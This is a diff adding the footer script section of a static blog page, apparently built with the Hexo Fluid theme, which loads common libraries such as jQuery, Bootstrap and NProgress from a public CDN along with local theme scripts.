+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
